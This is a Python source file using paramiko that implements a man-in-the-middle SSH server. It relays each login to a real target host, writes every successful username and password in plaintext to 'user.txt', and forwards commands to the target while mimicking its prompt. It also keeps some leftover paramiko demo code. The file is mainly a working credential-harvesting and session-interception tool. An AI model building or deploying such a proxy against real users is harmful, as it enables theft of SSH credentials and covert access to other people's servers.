from binascii import hexlify

import threading
import traceback

import paramiko
from paramiko.util import u
from base64 import decodebytes

import time

def on_connect(chan, addr, server):
    print(f"Connection from {addr}")

    # Получаем баннер с удаленного сервера
    global remote_banner
    remote_banner = chan.get_remote_banner()

    # Выводим баннер
    print("Remote Banner:")
    print(remote_banner)



class Server(paramiko.ServerInterface):
    # 'data' is the output of base64.b64encode(key)
    # (using the "user_rsa_key" files)
    data = (
        b"AAAAB3NzaC1yc2EAAAABIwAAAIEAyO4it3fHlmGZWJaGrfeHOVY7RWO3P9M7hp"
        b"fAu7jJ2d7eothvfeuoRFtJwhUmZDluRdFyhFY/hFAh76PJKGAusIqIQKlkJxMC"
        b"KDqIexkgHAfID/6mqvmnSJf0b5W8v5h2pI/stOSwTQ+pxVhwJ9ctYDhRSlF0iT"
        b"UWT10hcuO4Ks8="
    )
    good_pub_key = paramiko.RSAKey(data=decodebytes(data))

    def __init__(self, client_transport, target_host, target_port):
        self.client_transport = client_transport
        self.target_host = target_host
        self.target_port = target_port
        self.is_channel_exec_request = False
        self.channel = None
        self.target_transport = None

        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def get_target_prompt(self, username, password):
        buffer_size = 1000
        with paramiko.SSHClient() as ssh:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target_host, self.target_port, username, password, timeout=20)
            connection = ssh.invoke_shell()
            
            time.sleep(2)  
            while connection.recv_ready():
                connection.recv(buffer_size)
            connection.sendall('\n')

            time.sleep(.3)
            data = str(connection.recv(buffer_size), encoding='utf-8').strip()
            while connection.recv_ready():
                connection.recv(buffer_size)  
            
            return data



    def check_auth_password(self, username, password):


        # Establish a connection to the target SSH server
        try:
            self.target_transport = paramiko.Transport((self.target_host, self.target_port))
            self.target_transport.start_client()

            # Authenticate to the target server (you may customize the authentication method)
            self.target_transport.auth_password(username, password)

            with open('user.txt', 'a') as f:
                f.write(f"{username}: {password}\n")

            self.target_prompt = self.get_target_prompt(username, password)

            return paramiko.AUTH_SUCCESSFUL

        except Exception as e:
            print(f"Error connecting to target server: {e}")
            traceback.print_exc()
            return paramiko.AUTH_FAILED
    


    def check_auth_publickey(self, username, key):
        print("Auth attempt with key: " + u(hexlify(key.get_fingerprint())))
        if (username == "robey") and (key == self.good_pub_key):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_with_mic(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_gssapi_keyex(
        self, username, gss_authenticated=paramiko.AUTH_FAILED, cc_file=None
    ):
        if gss_authenticated == paramiko.AUTH_SUCCESSFUL:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def enable_auth_gssapi(self):
        return True

    def get_allowed_auths(self, username):
        return "gssapi-keyex,gssapi-with-mic,password,publickey"

    def check_channel_pty_request(
        self, channel, term, width, height, pixelwidth, pixelheight, modes
    ):
        self.channel = channel
        self.event.set()

        return True
    
    def check_channel_shell_request(self, channel):
        self.event.set()
        return True
    
    def check_channel_exec_request(self, channel, command):
        self.is_channel_exec_request = True
        try:
            res = self.exec_command(channel, command)
            channel.send_exit_status(res.returncode)
        except Exception as err:
            channel.send_exit_status(255)
        finally:
            self.event.set()
        return True


    
    def exec_command(self, channel, command):


        try:
            # Open a session on the target server
            target_session = self.target_transport.open_session()

            # Execute the command on the target server

            target_session.exec_command(command)


            # Wait for the command to complete and get the output
            output = target_session.makefile("rb", -1).read().decode("utf-8")

            exit_status = target_session.recv_exit_status()
            # Display the output on the console

            # Send the output back to the client
            channel.send(output)

            target_session.close()

            channel.send_exit_status(exit_status)

            # Close the session on the target server
        
        except Exception as e:
            print(f"Error executing command on target server: {e}")
            traceback.print_exc()
